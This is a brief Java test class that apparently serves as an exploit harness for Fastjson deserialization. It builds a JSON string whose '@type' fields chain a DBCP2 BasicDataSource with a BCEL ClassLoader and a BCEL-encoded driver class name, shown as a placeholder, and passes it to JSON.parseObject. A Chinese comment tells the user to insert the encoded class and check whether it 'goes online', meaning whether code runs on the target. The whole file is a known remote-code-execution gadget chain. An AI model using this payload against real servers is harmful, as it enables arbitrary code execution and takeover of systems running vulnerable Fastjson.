import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class TestClass
{

    static {
        System.out.println(1);
    }


    //填入BCELEncode后的driverClassName，测试是否上线
    void testFastJson(){
       // ParserConfig.getGlobalInstance().set
        String s =
                        "{\"@type\":\"org.apache.commons.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"$$BCEL$$$l$8b??????\"}";

        Object obj = JSON.parseObject( s);
    }
}
